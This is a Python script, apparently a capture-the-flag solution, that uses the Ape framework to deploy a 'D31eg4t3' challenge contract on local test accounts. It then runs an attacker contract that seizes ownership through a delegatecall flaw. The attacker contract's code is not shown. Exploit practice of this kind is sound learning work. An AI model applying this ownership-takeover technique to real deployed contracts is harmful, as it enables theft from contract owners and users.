from ape import accounts, project, networks


w3 = networks.provider.web3


def set_up():
    print("\n--- Setting up scenario ---\n")

    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    print("\n--- Deploying challenge contract ---\n")
    delegate = project.D31eg4t3.deploy(sender=deployer)

    # assert correct state of contract
    print("\n--- Ensuring the contract has the correct initial state ---\n")
    assert (
        w3.toChecksumAddress(
            "0x" + w3.eth.get_storage_at(delegate.address, 5).hex()[26:]
        )
        == deployer.address
    )

    return attacker, delegate


def main():
    attacker, delegate = set_up()

    print("\n--- Running exploit... ---\n")

    # deploy attacker contract
    attacker_contract = project.D31eg4t3Attacker.deploy(sender=attacker)

    # become owner via delegate call
    attacker_contract.attack(delegate.address, sender=attacker)

    assert delegate.owner() == attacker.address
    assert delegate.canYouHackMe(attacker.address)

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
